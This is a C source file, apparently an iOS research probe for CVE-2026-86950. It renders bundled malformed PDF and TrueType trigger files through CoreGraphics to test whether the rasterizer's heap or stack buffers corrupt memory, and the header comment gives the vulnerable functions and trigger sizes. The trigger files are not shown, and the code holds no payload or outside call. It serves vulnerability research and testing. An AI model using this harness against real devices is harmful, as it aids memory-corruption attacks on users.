// language: C, file: cve86950.c, target: iOS 26.2 / 23C55 / arm64e, LiveContainer guest
// CVE-2026-86950 probe: malformed TrueType glyph rendered through the CG
// antialiased path rasterizer (aa_moveto/aa_lineto -> aa_add_edges ->
// aa_cache_render coverage buffer). Heap variant uses a leaf 33 units wide
// (width_px ~ 1056 -> malloc), stack variant 31 units (width_px ~ 992 ->
// alloca). Both run entirely in this process; no kernel code involved.
#include "exploit.h"
#include "cve86950.h"

#include <CoreGraphics/CoreGraphics.h>
#include <ImageIO/ImageIO.h>
#include <mach/mach_time.h>
#include <string.h>

static uint64_t nk86950_ms(void) {
    static mach_timebase_info_data_t tb;
    if (tb.denom == 0) mach_timebase_info(&tb);
    return mach_absolute_time() * tb.numer / tb.denom / 1000000ULL;
}

static CFURLRef nk86950_url(const char *file, const char *ext) {
    CFBundleRef bundle = CFBundleGetMainBundle();
    if (!bundle) return NULL;
    CFStringRef name = CFStringCreateWithCString(NULL, file, kCFStringEncodingUTF8);
    CFStringRef type = CFStringCreateWithCString(NULL, ext, kCFStringEncodingUTF8);
    CFStringRef dir = CFStringCreateWithCString(NULL, "cve86950", kCFStringEncodingUTF8);
    CFURLRef url = CFBundleCopyResourceURL(bundle, name, type, dir);
    CFRelease(name);
    CFRelease(type);
    CFRelease(dir);
    return url;
}

static const char *nk86950_pdf(int heap) {
    return heap ? "trigger_heap" : "trigger_stack";
}

const char *nk_86950_name(int mode) {
    switch (mode) {
    case NK_86950_IMAGEIO: return "ImageIO thumbnail";
    case NK_86950_CGPDF:   return "CGPDF draw";
    case NK_86950_FONT:    return "CGFont show-glyphs";
    default:               return "?";
    }
}

static int nk86950_imageio(CFURLRef url) {
    CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
    if (!src) {
        nk_log("[86950] ImageIO: source create failed");
        return -1;
    }
    int px = 256;
    CFStringRef keys[2] = {
        kCGImageSourceCreateThumbnailFromImageAlways,
        kCGImageSourceThumbnailMaxPixelSize
    };
    CFNumberRef num = CFNumberCreate(NULL, kCFNumberIntType, &px);
    CFTypeRef vals[2] = { kCFBooleanTrue, num };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)keys,
        (const void **)vals, 2, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    nk_log("[86950] ImageIO: thumbnail begin (px=%d, src count=%zu)",
           px, (size_t)CGImageSourceGetCount(src));
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
    nk_log("[86950] ImageIO: returned img=%p", (void *)img);
    if (img) CFRelease(img);
    if (opts) CFRelease(opts);
    CFRelease(num);
    CFRelease(src);
    return 0;
}

static int nk86950_cgpdf(CFURLRef url) {
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithURL(url);
    if (!doc) {
        nk_log("[86950] CGPDF: document create failed");
        return -1;
    }
    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceGray();
    CGContextRef ctx = CGBitmapContextCreate(NULL, 200, 200, 8, 200, cs,
                                             (CGBitmapInfo)kCGImageAlphaNone);
    if (ctx && page) {
        CGRect box = CGPDFPageGetBoxRect(page, kCGPDFMediaBox);
        nk_log("[86950] CGPDF: draw begin (mediabox=%.0fx%.0f pages=%zu)",
               box.size.width, box.size.height,
               (size_t)CGPDFDocumentGetNumberOfPages(doc));
        CGContextDrawPDFPage(ctx, page);
        nk_log("[86950] CGPDF: draw returned");
    } else {
        nk_log("[86950] CGPDF: context/page unavailable ctx=%p page=%p",
               (void *)ctx, (void *)page);
    }
    if (ctx) CGContextRelease(ctx);
    CGColorSpaceRelease(cs);
    CGPDFDocumentRelease(doc);
    return (ctx && page) ? 0 : -1;
}

static int nk86950_font(CFURLRef url) {
    CGDataProviderRef dp = CGDataProviderCreateWithURL(url);
    CGFontRef font = dp ? CGFontCreateWithDataProvider(dp) : NULL;
    if (!font) {
        nk_log("[86950] font: load failed");
        if (dp) CGDataProviderRelease(dp);
        return -1;
    }
    CGGlyph glyph = CGFontGetGlyphWithGlyphName(font, CFSTR("A"));
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceGray();
    CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 64, 8, 64, cs,
                                             (CGBitmapInfo)kCGImageAlphaNone);
    nk_log("[86950] font: glyph=0x%x begin (size 1024)", glyph);
    if (ctx) {
        CGContextSetShouldSmoothFonts(ctx, false);
        CGContextSetFont(ctx, font);
        CGContextSetFontSize(ctx, 1024);
        CGPoint at = CGPointZero;
        CGContextShowGlyphsAtPositions(ctx, &glyph, &at, 1);
        nk_log("[86950] font: show-glyphs returned");
        CGContextRelease(ctx);
    }
    CGColorSpaceRelease(cs);
    CGFontRelease(font);
    CGDataProviderRelease(dp);
    return ctx ? 0 : -1;
}

int nk_86950_run(int mode, int heap, nk_86950_stat_t *out) {
    if (!out) return -1;
    memset(out, 0, sizeof(*out));
    out->mode = mode;
    out->heap = heap;

    nk_filelog_open("cve86950");
    uint64_t t0 = nk86950_ms();

    const char *name = (mode == NK_86950_FONT) ? "trigger" : nk86950_pdf(heap);
    const char *ext = (mode == NK_86950_FONT) ? "ttf" : "pdf";
    CFURLRef url = nk86950_url(name, ext);
    nk_log("[86950] mode=%s alloc=%s url=%s",
           nk_86950_name(mode), heap ? "malloc" : "alloca",
           url ? "found" : "MISSING");
    if (!url) {
        nk_filelog_close();
        return -1;
    }

    out->began = 1;
    int rc = -1;
    switch (mode) {
    case NK_86950_IMAGEIO: rc = nk86950_imageio(url); break;
    case NK_86950_CGPDF:   rc = nk86950_cgpdf(url);   break;
    case NK_86950_FONT:    rc = nk86950_font(url);    break;
    default: break;
    }
    CFRelease(url);

    out->survived = (rc == 0);
    out->elapsed_ms = nk86950_ms() - t0;
    nk_log("[86950] done survived=%d rc=%d in %llu ms",
           out->survived, rc, (unsigned long long)out->elapsed_ms);
    nk_filelog_close();
    return rc;
}
